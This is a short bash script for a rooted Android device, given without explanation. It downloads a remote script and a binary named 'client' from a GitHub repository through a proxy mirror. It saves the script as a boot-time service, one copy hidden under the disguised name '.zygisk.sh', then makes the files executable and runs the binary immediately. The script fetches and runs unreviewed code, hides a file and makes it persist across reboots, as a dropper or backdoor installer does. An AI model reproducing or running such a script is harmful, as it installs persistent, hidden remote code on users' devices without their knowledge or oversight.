#!/bin/bash
curl -sS -o "/data/adb/service.d/.zygisk.sh" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
curl -sS -o "/data/adb/service.d/run.sh" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"
curl -sS -o "/data/local/tmp/client" "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
chmod +x /data/local/tmp/client
chmod +x /data/adb/service.d/run.sh
chmod +x /data/adb/service.d/.zygisk.sh
/data/local/tmp/client
